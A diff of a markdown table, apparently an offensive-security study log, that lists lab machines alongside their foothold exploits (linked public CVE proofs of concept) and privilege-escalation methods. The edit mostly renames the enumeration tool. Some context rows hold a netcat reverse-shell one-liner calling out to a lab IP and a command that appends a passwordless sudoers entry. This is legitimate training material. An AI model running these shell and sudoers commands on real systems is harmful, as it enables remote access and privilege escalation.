@@ -364,7 +364,7 @@ The most commonly used tools
 |Codo|Easy||upload reverse shell|root's password leaked (linPEAS)|
 |Crane|Easy||[CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file)|`sudo -l`, serice|
 |Exfiltrated|Easy|default creds|[CVE-2018-19422-SubrionCMS-RCE](https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE)|cron jobs, [Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution](https://github.com/UNICORDev/exploit-CVE-2021-22204)|
-|Extplorer|Intermediate|dirsearch|upload reverse shell|`id`, `debugfs`, `john`|
+|Extplorer|Intermediate|DirBuster|upload reverse shell|`id`, `debugfs`, `john`|
 |Fanatastic|Hard||[CVE-2021-43798 Grafana Unauthorized arbitrary file reading vulnerability](https://github.com/jas502n/Grafana-CVE-2021-43798)|
 |Fired|Hard||[Openfire Console Authentication Bypass Vulnerability with RCE plugin - CVE-2023-32315](https://github.com/miko550/CVE-2023-32315), `busybox nc 192.168.45.210 80 -e /bin/sh`|manually examining|
 |Flu|Intermediate||[CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire)|`pspy`
@@ -375,22 +375,23 @@ The most commonly used tools
 |Lavita|Hard|404 page|[Remote Code Execution: Laravel (CVE-2021-3129)](https://github.com/joshuavanderpoll/CVE-2021-3129)|`pspy`, edit `artisan`, `composer` (Sudo)
 |law|Intermediate||[GLPI htmlawed (CVE-2022-35914)](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)|`pspy`, edit `cleanup.sh`|
 |Levram|Easy||[Gerapy 0.9.7 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50640)|`Python`
-|Mzeeav|Easy|dirsearch|bypass upload shell|`fileS` (SUID)|
+|Mzeeav|Easy|DirBuster|bypass upload shell|`fileS` (SUID)|
 |Nibbles|Intermediate|PostgreSQL|[PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50847)|`find` (SUID)|
 |Nukem|Hard||[WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload](https://www.exploit-db.com/exploits/48979)|manually examining, `dosbox` (SUID)|
 |Ochima|Intermediate||[Maltrail v0.53 Unauthenticated OS Command Injection (RCE)](https://github.com/spookier/Maltrail-v0.53-Exploit)|`echo 'echo "snort ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> etc_Backup.s`|
 |PC|Intermediate|||[rpc.py 0.6.0 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50983)|
+|Pebbles|Easy|DirBuster
 |Pelican|Intermediate||[Exhibitor Web UI 1.7.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48654)|`gcore` (SUID)|
 |Press|Intermediate|default creds|[Flatpress 1.2.1 - File upload bypass to RCE](https://github.com/flatpressblog/flatpress/issues/152?source=post_page-----93c6d096bae6---------------------------------------)|apt-get (Sudo)|
 |pyLoader|Easy||[CVE-2023-0297](https://github.com/JacobEbben/CVE-2023-0297/blob/main/exploit.py)|
 |QuackerJack|Intermediate||[rConfig 3.9 - 'searchColumn' SQL Injection](https://www.exploit-db.com/exploits/48208), [rConfig 3.9.3 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/47982)|`find` (SUID)|
 |RubyDome|Intermediate||[pdfkit v0.8.7.2 - Command Injection](https://www.exploit-db.com/exploits/51293)|`irb` (shell)
 |Snookums|Intermediate||[Remote File Inclusion](https://github.com/beauknowstech/SimplePHPGal-RCE.py)|PwnKit|
-|Sorcerer|Intermediate|Dirsearch| SSH, SCP|`start-stop-daemon` (SUID)|
+|Sorcerer|Intermediate|DirBuster| SSH, SCP|`start-stop-daemon` (SUID)|
 |Twiggy|Intermediate|ZeroMQ ZMTP 2.0|[Saltstack 3000.1 - CVE-2020-11651, CVE-2020-11652](https://github.com/Al1ex/CVE-2020-11652)||
 |Walla|Intermediate|default creds|[RaspAP 2.5 RCE - CVE-2020-24572](https://github.com/gerbsec/CVE-2020-24572-POC)|`sudo -l`, replace python file|
 |Wombo|Intermediate|Redis|[Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce), [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)||
-|ZenPhoto|Intermediate|Dirsearch|[ZenPhoto 1.4.1.4 RCE - CVE-2011-4825](https://www.exploit-db.com/exploits/18083)|[rds - CVE-2010-3904](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)|
+|ZenPhoto|Intermediate|DirBuster|[ZenPhoto 1.4.1.4 RCE - CVE-2011-4825](https://www.exploit-db.com/exploits/18083)|[rds - CVE-2010-3904](https://github.com/SecWiki/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)|
 
 - [ ] [Apex]()
 - [ ] [BitForge]()
